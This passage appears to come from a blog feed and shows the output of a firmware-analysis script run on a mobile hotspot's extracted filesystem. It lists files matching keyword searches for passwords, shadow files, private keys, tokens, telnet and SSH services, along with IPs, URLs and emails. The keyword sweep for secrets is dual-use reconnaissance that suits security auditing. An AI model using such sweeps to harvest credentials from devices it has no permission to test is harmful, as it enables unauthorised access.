*.conf<br>t&#x2F;etc&#x2F;wpa_supplicant.conf<br>t&#x2F;etc&#x2F;avahi&#x2F;avahi-daemon.conf<br>t&#x2F;etc&#x2F;pimd.conf<br>t&#x2F;etc&#x2F;mdev.conf<br>t&#x2F;etc&#x2F;AR6004_AP1_hostapd.conf<br>t&#x2F;etc&#x2F;inadyn-mt.conf<br>t&#x2F;etc&#x2F;dbus-1&#x2F;system.d&#x2F;avahi-dbus.conf<br>t&#x2F;etc&#x2F;dbus-1&#x2F;session.conf<br>t&#x2F;etc&#x2F;dbus-1&#x2F;system.conf<br>t&#x2F;etc&#x2F;hostapd.conf<br>t&#x2F;etc&#x2F;host.conf<br>t&#x2F;etc&#x2F;AR6003_hostapd.conf<br>t&#x2F;etc&#x2F;igd&#x2F;miniupnpd.conf<br>t&#x2F;etc&#x2F;nsswitch.conf<br>t&#x2F;etc&#x2F;AR6004_hostapd.conf<br>t&#x2F;etc&#x2F;radvd.conf<br>t&#x2F;etc&#x2F;AR6003_AP1_hostapd.conf</p><p>##################################### *.cfg</p><p>##################################### *.ini</p><p><em><strong>Search for database related files</strong></em><br>##################################### *.db</p><p>##################################### *.sqlite</p><p>##################################### *.sqlite3</p><p><em><strong>Search for shell scripts</strong></em><br>##################################### shell scripts<br>t&#x2F;etc&#x2F;rc4.d&#x2F;S99rmnologin.sh<br>t&#x2F;etc&#x2F;mdev&#x2F;usb.sh<br>t&#x2F;etc&#x2F;mdev&#x2F;automountsdcard.sh<br>t&#x2F;etc&#x2F;mdev&#x2F;automounthdd.sh<br>t&#x2F;etc&#x2F;mdev&#x2F;find-touchscreen.sh<br>t&#x2F;etc&#x2F;bash_completion.d&#x2F;gdbus-bash-completion.sh<br>t&#x2F;etc&#x2F;bash_completion.d&#x2F;gsettings-bash-completion.sh<br>t&#x2F;etc&#x2F;rc2.d&#x2F;S99rmnologin.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S04modutils.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S02sysfs.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S38devpts.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S06alignment.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S45mountnfs.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S39hostname.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S10checkroot.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S02banner.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S37populate-volatile.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S35mountall.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S55bootmisc.sh<br>t&#x2F;etc&#x2F;rcS.d&#x2F;S01keymap.sh<br>t&#x2F;etc&#x2F;rc0.d&#x2F;S25save-rtc.sh<br>t&#x2F;etc&#x2F;rc0.d&#x2F;S31umountnfs.sh<br>t&#x2F;etc&#x2F;rc6.d&#x2F;S25save-rtc.sh<br>t&#x2F;etc&#x2F;rc6.d&#x2F;S31umountnfs.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;modutils.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;banner.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;devpts.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;checkroot.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;hostname.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;bootmisc.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;save-rtc.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;sysfs.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;set-hwver.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;mountnfs.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;keymap.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;hwclock.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;mountall.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;umountnfs.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;alignment.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;populate-volatile.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;rmnologin.sh<br>t&#x2F;etc&#x2F;rc5.d&#x2F;S99rmnologin.sh<br>t&#x2F;etc&#x2F;qdt_rc0clean.sh<br>t&#x2F;etc&#x2F;rc3.d&#x2F;S99rmnologin.sh</p><p><em><strong>Search for other .bin files</strong></em><br>##################################### bin files<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6004&#x2F;hw3.0&#x2F;bdata.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6004&#x2F;hw3.0&#x2F;otp.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6004&#x2F;hw3.0&#x2F;fw-3.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6004&#x2F;hw3.0&#x2F;utf.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;otp.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;bdata.SD31.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;athtcmd_ram.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;data.patch.hw3_0.bin<br>t&#x2F;lib&#x2F;firmware&#x2F;ath6k&#x2F;AR6003&#x2F;hw2.1.1&#x2F;athwlan_router.bin</p><p><em><strong>Search for patterns in files</strong></em><br>â€”â€”â€”â€”â€”â€”â€“ upgrade â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;sbin&#x2F;fotad<br>t&#x2F;bin&#x2F;lcdd<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;tinyproxy<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;bin&#x2F;lcdtest<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox-syslog.prerm</p><p>â€”â€”â€”â€”â€”â€”â€“ admin â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;bin&#x2F;amapi<br>t&#x2F;bin&#x2F;tr069<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;appmgr<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;etc&#x2F;services<br>t&#x2F;etc&#x2F;passwd<br>t&#x2F;etc&#x2F;passwd-<br>t&#x2F;lib&#x2F;libamapi.so<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;cgi-bin&#x2F;qcmap_auth<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_login.html<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.preinst</p><p>â€”â€”â€”â€”â€”â€”â€“ root â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;sbin&#x2F;ip.iproute2<br>t&#x2F;sbin&#x2F;readprofile.util-linux<br>t&#x2F;sbin&#x2F;shutdown.sysvinit<br>t&#x2F;sbin&#x2F;fdisk.util-linux<br>t&#x2F;sbin&#x2F;dnsmasq_qmi<br>t&#x2F;sbin&#x2F;swapon.util-linux<br>t&#x2F;sbin&#x2F;dlna6_dms<br>t&#x2F;sbin&#x2F;adbd<br>t&#x2F;sbin&#x2F;tc<br>t&#x2F;sbin&#x2F;miniupnpd<br>t&#x2F;sbin&#x2F;ddns_qmi<br>t&#x2F;sbin&#x2F;ctrlaltdel<br>t&#x2F;sbin&#x2F;killall5<br>t&#x2F;sbin&#x2F;cfdisk<br>t&#x2F;bin&#x2F;tinylogin<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;mount.util-linux<br>t&#x2F;bin&#x2F;radvd<br>t&#x2F;bin&#x2F;login.shadow<br>t&#x2F;bin&#x2F;tinyproxy<br>t&#x2F;bin&#x2F;ramond<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;bin&#x2F;umount.util-linux<br>t&#x2F;etc&#x2F;login.defs<br>t&#x2F;etc&#x2F;default&#x2F;rcS<br>t&#x2F;etc&#x2F;default&#x2F;volatiles&#x2F;00_core<br>t&#x2F;etc&#x2F;shadow<br>t&#x2F;etc&#x2F;securetty<br>t&#x2F;etc&#x2F;dbus-1&#x2F;system.d&#x2F;avahi-dbus.conf<br>t&#x2F;etc&#x2F;limits<br>t&#x2F;etc&#x2F;init.d&#x2F;checkroot.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;bootmisc.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;usb<br>t&#x2F;etc&#x2F;init.d&#x2F;hwclock.sh<br>t&#x2F;etc&#x2F;init.d&#x2F;power_config<br>t&#x2F;etc&#x2F;init.d&#x2F;avahi-daemon<br>t&#x2F;etc&#x2F;group<br>t&#x2F;etc&#x2F;udhcpc.d&#x2F;udhcpc.script<br>t&#x2F;etc&#x2F;gshadow<br>t&#x2F;etc&#x2F;passwd<br>t&#x2F;etc&#x2F;group-<br>t&#x2F;etc&#x2F;passwd-<br>t&#x2F;lib&#x2F;libjansson.so<br>t&#x2F;lib&#x2F;libmount.so.1<br>t&#x2F;lib&#x2F;libqutils.so<br>t&#x2F;lib&#x2F;libblkid.so.1<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dbus-1.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-daemon.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-files.list</p><p>â€”â€”â€”â€”â€”â€”â€“ password â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;sbin&#x2F;losetup.util-linux<br>t&#x2F;sbin&#x2F;ddns_qmi<br>t&#x2F;bin&#x2F;amapi<br>t&#x2F;bin&#x2F;tr069<br>t&#x2F;bin&#x2F;tinylogin<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;mount.util-linux<br>t&#x2F;bin&#x2F;login.shadow<br>t&#x2F;bin&#x2F;appmgr<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;bin&#x2F;qmodmd<br>t&#x2F;bin&#x2F;umount.util-linux<br>t&#x2F;etc&#x2F;login.defs<br>t&#x2F;etc&#x2F;tr069&#x2F;param.xml<br>t&#x2F;etc&#x2F;tr069&#x2F;igd_10.xml<br>t&#x2F;etc&#x2F;inadyn-mt.conf<br>t&#x2F;lib&#x2F;libc.so.6<br>t&#x2F;lib&#x2F;libqutils.so<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_Account.html<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_login.html<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_Account_Help.html<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-autoipd.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.control<br>t&#x2F;disk&#x2F;internal-storage.iso</p><p>â€”â€”â€”â€”â€”â€”â€“ passwd â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;sbin&#x2F;vipw.shadow<br>t&#x2F;bin&#x2F;amapi<br>t&#x2F;bin&#x2F;tinylogin<br>t&#x2F;bin&#x2F;amgrevt<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;login.shadow<br>t&#x2F;bin&#x2F;appmgr<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;bin&#x2F;qmodmd<br>t&#x2F;etc&#x2F;login.defs<br>t&#x2F;etc&#x2F;services<br>t&#x2F;etc&#x2F;init.d&#x2F;populate-volatile.sh<br>t&#x2F;etc&#x2F;nsswitch.conf<br>t&#x2F;etc&#x2F;busybox.links<br>t&#x2F;lib&#x2F;libc.so.6<br>t&#x2F;lib&#x2F;libnss_compat.so.2<br>t&#x2F;lib&#x2F;libqutils.so<br>t&#x2F;lib&#x2F;libnss_files.so.2<br>t&#x2F;lib&#x2F;libamapi.so<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;passwd<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox-mountall.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox-mdev.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dbus-1.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;base-passwd.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-daemon.preinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-autoipd.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.prerm<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;avahi-daemon.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;shadow.list<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;router.list<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dbus-1.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox-syslog.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;busybox.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;tinylogin.list<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;task-core-boot.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;status</p><p>â€”â€”â€”â€”â€”â€”â€“ pwd â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;bin&#x2F;amapi<br>t&#x2F;bin&#x2F;tinylogin<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;login.shadow<br>t&#x2F;bin&#x2F;appmgr<br>t&#x2F;bin&#x2F;ramond<br>t&#x2F;bin&#x2F;qmodmd<br>t&#x2F;etc&#x2F;busybox.links<br>t&#x2F;lib&#x2F;libc.so.6<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_login.html<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;pwd</p><p>â€”â€”â€”â€”â€”â€”â€“ dropbear â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;etc&#x2F;init.d&#x2F;dropbear<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.postrm<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.prerm<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.list<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;dropbear.postinst<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;status</p><p>â€”â€”â€”â€”â€”â€”â€“ ssl â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;bin&#x2F;tinyproxy<br>t&#x2F;bin&#x2F;agent<br>t&#x2F;etc&#x2F;services<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;libcrypto1.0.0.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;libssl1.0.0.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;openssl.control<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;info&#x2F;openssl.list</p><p>â€”â€”â€”â€”â€”â€”â€“ private key â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;bin&#x2F;agent</p><p>â€”â€”â€”â€”â€”â€”â€“ telnet â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;etc&#x2F;services<br>t&#x2F;etc&#x2F;default&#x2F;rcS<br>t&#x2F;etc&#x2F;busybox.links<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;telnet</p><p>â€”â€”â€”â€”â€”â€”â€“ secret â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;bin&#x2F;dhcp6s<br>t&#x2F;bin&#x2F;dhcp6c</p><p>â€”â€”â€”â€”â€”â€”â€“ pgp â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;lib&#x2F;libresolv.so.2</p><p>â€”â€”â€”â€”â€”â€”â€“ gpg â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;disk&#x2F;internal-storage.iso</p><p>â€”â€”â€”â€”â€”â€”â€“ token â€”â€”â€”â€”â€”â€”â€“<br>t&#x2F;sbin&#x2F;iwconfig<br>t&#x2F;sbin&#x2F;adbd<br>t&#x2F;sbin&#x2F;tc<br>t&#x2F;bin&#x2F;busybox<br>t&#x2F;bin&#x2F;qmiweb<br>t&#x2F;bin&#x2F;radvd<br>t&#x2F;bin&#x2F;ramond<br>t&#x2F;lib&#x2F;libjansson.so<br>t&#x2F;lib&#x2F;libc.so.6<br>t&#x2F;lib&#x2F;ld-linux.so.3<br>t&#x2F;lib&#x2F;libsqlite3.so.0<br>t&#x2F;lib&#x2F;libmount.so.1<br>t&#x2F;lib&#x2F;libqutils.so<br>t&#x2F;lib&#x2F;libblkid.so.1<br>t&#x2F;lib&#x2F;libpcap.so.1<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_Firewall.html<br>t&#x2F;WEBSERVER&#x2F;www&#x2F;QCMAP_WLAN.html</p><p>â€”â€”â€”â€”â€”â€”â€“ api key â€”â€”â€”â€”â€”â€”â€“</p><p>â€”â€”â€”â€”â€”â€”â€“ oauth â€”â€”â€”â€”â€”â€”â€“</p><p><em><strong>Search for web servers</strong></em><br>##################################### search for web servers<br>##################################### apache</p><p>##################################### lighttpd</p><p>##################################### alphapd</p><p>##################################### httpd<br>t&#x2F;sbin&#x2F;httpd<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;httpd</p><p><em><strong>Search for important binaries</strong></em><br>##################################### important binaries<br>##################################### ssh<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;ssh</p><p>##################################### sshd</p><p>##################################### scp<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;scp</p><p>##################################### sftp</p><p>##################################### tftp<br>t&#x2F;bin&#x2F;tftp<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;tftp</p><p>##################################### dropbear<br>t&#x2F;etc&#x2F;dropbear<br>t&#x2F;etc&#x2F;init.d&#x2F;dropbear</p><p>##################################### busybox<br>t&#x2F;bin&#x2F;busybox</p><p>##################################### telnet<br>t&#x2F;bin&#x2F;telnet<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;telnet</p><p>##################################### telnetd<br>t&#x2F;sbin&#x2F;telnetd<br>t&#x2F;var&#x2F;lib&#x2F;opkg&#x2F;alternatives&#x2F;telnetd</p><p>##################################### openssl</p><p><em><strong>Search for ip addresses</strong></em><br>##################################### ip addresses<br>0.0.0.0<br>127.0.0.1<br>1.4.12.1<br>169.254.0.0<br>169.254.255.255<br>192.168.0.0<br>192.168.0.1<br>192.168.0.20<br>192.168.0.40<br>192.168.1.0<br>192.168.10.1<br>192.168.10.109<br>192.168.1.1<br>192.168.1.20<br>192.168.1.40<br>192.168.1.8<br>192.168.2.1<br>192.168.2.20<br>192.168.2.40<br>192.168.50.1<br>192.168.50.2<br>192.168.7.0<br>192.168.7.1<br>192.168.7.113<br>192.168.7.2<br>224.0.0.0<br>255.255.0.0<br>255.255.255.0<br>255.255.255.255<br>4.1.4.2<br>4.1.4.3<br>88.22.44.13</p><p><em><strong>Search for urls</strong></em><br>##################################### urls<br><a href="http://0pointer.de/">http://0pointer.de</a><br><a href="http://avahi.org/">http://avahi.org</a><br><a href="http://codeaurora.org/">http://codeaurora.org</a><br><a href="http://code.google.com/">http://code.google.com</a><br><a href="http://dbus.freedesktop.org/">http://dbus.freedesktop.org</a><br><a href="http://developer.android.com/">http://developer.android.com</a><br><a href="http://download.savannah.gnu.org/">http://download.savannah.gnu.org</a><br><a href="http://downloads.sourceforge.net/">http://downloads.sourceforge.net</a><br><a href="http://ebtables.sourceforge.net/">http://ebtables.sourceforge.net</a><br><a href="http://expat.sourceforge.net/">http://expat.sourceforge.net</a><br><a href="http://ftp.gnome.org/">http://ftp.gnome.org</a><br><a href="http://kernel.org/">http://kernel.org</a><br><a href="http://linuxwireless.org/">http://linuxwireless.org</a><br><a href="http://matt.ucc.asn.au/">http://matt.ucc.asn.au</a><br><a href="http://miniupnp.free.fr/">http://miniupnp.free.fr</a><br><a href="http://netfilter.org/">http://netfilter.org</a><br><a href="http://packages.debian.org/">http://packages.debian.org</a><br><a href="http://pkg-shadow.alioth.debian.org/">http://pkg-shadow.alioth.debian.org</a><br><a href="http://savannah.nongnu.org/">http://savannah.nongnu.org</a><br><a href="http://sites.google.com/">http://sites.google.com</a><br><a href="http://sourceforge.net/">http://sourceforge.net</a><br><a href="http://support.cdmatech.com/">http://support.cdmatech.com</a><br><a href="http://theory.uwinnipeg.ca/">http://theory.uwinnipeg.ca</a><br><a href="http://tinylogin.busybox.net/">http://tinylogin.busybox.net</a><br><a href="http://wireless.kernel.org/">http://wireless.kernel.org</a><br><a href="http://www.angstrom-distribution.org/">http://www.angstrom-distribution.org</a><br><a href="http://www.busybox.net/">http://www.busybox.net</a><br><a href="http://www.eglibc.org/">http://www.eglibc.org</a><br><a href="http://www.freebsd.org/">http://www.freebsd.org</a><br><a href="http://www.freedesktop.org/">http://www.freedesktop.org</a><br><a href="http://www.gnu.org/">http://www.gnu.org</a><br><a href="http://www.hpl.hp.com/">http://www.hpl.hp.com</a><br><a href="http://www.iana.org/">http://www.iana.org</a><br><a href="http://www.info-zip.org/">http://www.info-zip.org</a><br><a href="http://www.infradead.org/">http://www.infradead.org</a><br><a href="http://www.linuxfoundation.org/">http://www.linuxfoundation.org</a><br><a href="http://www.linux-mtd.infradead.org/">http://www.linux-mtd.infradead.org</a><br><a href="http://www.mylan/">http://www.mylan</a><br><a href="http://www.netfilter.org/">http://www.netfilter.org</a><br><a href="http://www.openssl.org/">http://www.openssl.org</a><br><a href="http://www.quantatw.com/">http://www.quantatw.com</a><br><a href="http://www.tcpdump.org/">http://www.tcpdump.org</a><br><a href="http://www.w3.org/">http://www.w3.org</a><br><a href="http://www.xmlsoft.org/">http://www.xmlsoft.org</a><br><a href="http://www.zlib.net/">http://www.zlib.net</a><br><a href="http://zlib.net/">http://zlib.net</a></p><p><em><strong>Search for emails</strong></em><br>##################################### emails<br><a href="mailto:&#97;&#x6a;&#116;&#x40;&#x64;&#101;&#98;&#x69;&#97;&#x6e;&#x2e;&#111;&#x72;&#x67;">&#97;&#x6a;&#116;&#x40;&#x64;&#101;&#98;&#x69;&#97;&#x6e;&#x2e;&#111;&#x72;&#x67;</a><br><a href="mailto:&#x62;&#x64;&#115;&#x63;&#x68;&#x75;&#x79;&#x6d;&#x40;&#112;&#97;&#110;&#100;&#x6f;&#114;&#97;&#x2e;&#x62;&#101;">&#x62;&#x64;&#115;&#x63;&#x68;&#x75;&#x79;&#x6d;&#x40;&#112;&#97;&#110;&#100;&#x6f;&#114;&#97;&#x2e;&#x62;&#101;</a><br><a href="mailto:&#x42;&#x72;&#117;&#99;&#x65;&#64;&#80;&#105;&#x78;&#97;&#114;&#46;&#99;&#111;&#x6d;">&#x42;&#x72;&#117;&#99;&#x65;&#64;&#80;&#105;&#x78;&#97;&#114;&#46;&#99;&#111;&#x6d;</a><br><a href="mailto:&#98;&#114;&#x75;&#x6e;&#x6f;&#x2e;&#x72;&#x61;&#110;&#100;&#x6f;&#108;&#x66;&#x40;&#52;&#103;&#45;&#115;&#x79;&#x73;&#x74;&#x65;&#109;&#x73;&#46;&#x62;&#105;&#x7a;">&#98;&#114;&#x75;&#x6e;&#x6f;&#x2e;&#x72;&#x61;&#110;&#100;&#x6f;&#108;&#x66;&#x40;&#52;&#103;&#45;&#115;&#x79;&#x73;&#x74;&#x65;&#109;&#x73;&#46;&#x62;&#105;&#x7a;</a><br><a href="mailto:&#100;&#97;&#x67;&#64;&#x77;&#105;&#101;&#101;&#114;&#x73;&#x2e;&#99;&#111;&#109;">&#100;&#97;&#x67;&#64;&#x77;&#105;&#101;&#101;&#114;&#x73;&#x2e;&#99;&#111;&#109;</a><br><a href="mailto:&#x64;&#x65;&#x66;&#97;&#117;&#108;&#116;&#64;&#x6e;&#x6f;&#45;&#x69;&#x70;&#46;&#99;&#111;&#x6d;">&#x64;&#x65;&#x66;&#97;&#117;&#108;&#116;&#64;&#x6e;&#x6f;&#45;&#x69;&#x70;&#46;&#99;&#111;&#x6d;</a><br><a href="mailto:&#109;&#x69;&#x71;&#117;&#101;&#x6c;&#x73;&#x40;&#x63;&#x69;&#x73;&#116;&#x72;&#x6f;&#x6e;&#46;&#x6e;&#108;">&#109;&#x69;&#x71;&#117;&#101;&#x6c;&#x73;&#x40;&#x63;&#x69;&#x73;&#116;&#x72;&#x6f;&#x6e;&#46;&#x6e;&#108;</a><br><a href="mailto:&#111;&#112;&#x65;&#x6e;&#101;&#109;&#x62;&#x65;&#100;&#100;&#101;&#100;&#x2d;&#x63;&#111;&#114;&#x65;&#64;&#x6c;&#105;&#x73;&#116;&#115;&#46;&#111;&#x70;&#101;&#x6e;&#101;&#109;&#98;&#x65;&#100;&#x64;&#101;&#x64;&#46;&#111;&#114;&#x67;">&#111;&#112;&#x65;&#x6e;&#101;&#109;&#x62;&#x65;&#100;&#100;&#101;&#100;&#x2d;&#x63;&#111;&#114;&#x65;&#64;&#x6c;&#105;&#x73;&#116;&#115;&#46;&#111;&#x70;&#101;&#x6e;&#101;&#109;&#98;&#x65;&#100;&#x64;&#101;&#x64;&#46;&#111;&#114;&#x67;</a><br><a href="mailto:&#114;&#x6f;&#x6b;&#46;&#112;&#x61;&#x70;&#x65;&#x7a;&#x40;&#x61;&#114;&#110;&#101;&#115;&#x2e;&#115;&#105;">&#114;&#x6f;&#x6b;&#46;&#112;&#x61;&#x70;&#x65;&#x7a;&#x40;&#x61;&#114;&#110;&#101;&#115;&#x2e;&#115;&#105;</a><br><a href="mailto:&#x72;&#x70;&#x75;&#114;&#x64;&#105;&#101;&#x40;&#x6f;&#112;&#x65;&#110;&#101;&#100;&#104;&#x61;&#x6e;&#x64;&#46;&#x63;&#x6f;&#x6d;">&#x72;&#x70;&#x75;&#114;&#x64;&#105;&#101;&#x40;&#x6f;&#112;&#x65;&#110;&#101;&#100;&#104;&#x61;&#x6e;&#x64;&#46;&#x63;&#x6f;&#x6d;</a><br><a href="mailto:&#115;&#97;&#x6e;&#100;&#x6d;&#x61;&#x6e;&#64;&#104;&#97;&#x6e;&#100;&#x68;&#x65;&#x6c;&#x64;&#115;&#x2e;&#x6f;&#114;&#x67;">&#115;&#97;&#x6e;&#100;&#x6d;&#x61;&#x6e;&#64;&#104;&#97;&#x6e;&#100;&#x68;&#x65;&#x6c;&#x64;&#115;&#x2e;&#x6f;&#114;&#x67;</a><br><a href="mailto:&#115;&#101;&#98;&#x61;&#115;&#116;&#105;&#x65;&#x6e;&#x2e;&#x65;&#115;&#116;&#x69;&#101;&#x6e;&#x6e;&#101;&#64;&#x67;&#x6d;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;">&#115;&#101;&#98;&#x61;&#115;&#116;&#105;&#x65;&#x6e;&#x2e;&#x65;&#115;&#116;&#x69;&#101;&#x6e;&#x6e;&#101;&#64;&#x67;&#x6d;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a><br><a href="mailto:&#x73;&#x72;&#x62;&#64;&#x63;&#117;&#x63;&#x69;&#46;&#x6e;&#108;">&#x73;&#x72;&#x62;&#64;&#x63;&#117;&#x63;&#x69;&#46;&#x6e;&#108;</a><br><a href="mailto:&#84;&#x69;&#109;&#x40;&#x52;&#x69;&#x6b;&#x65;&#x72;&#115;&#46;&#x6f;&#114;&#103;">&#84;&#x69;&#109;&#x40;&#x52;&#x69;&#x6b;&#x65;&#x72;&#115;&#46;&#x6f;&#114;&#103;</a><br><a href="mailto:&#x77;&#x61;&#108;&#x74;&#x65;&#x72;&#x73;&#x40;&#100;&#x65;&#x62;&#105;&#x61;&#x6e;&#x2e;&#111;&#114;&#103;">&#x77;&#x61;&#108;&#x74;&#x65;&#x72;&#x73;&#x40;&#100;&#x65;&#x62;&#105;&#x61;&#x6e;&#x2e;&#111;&#114;&#103;</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
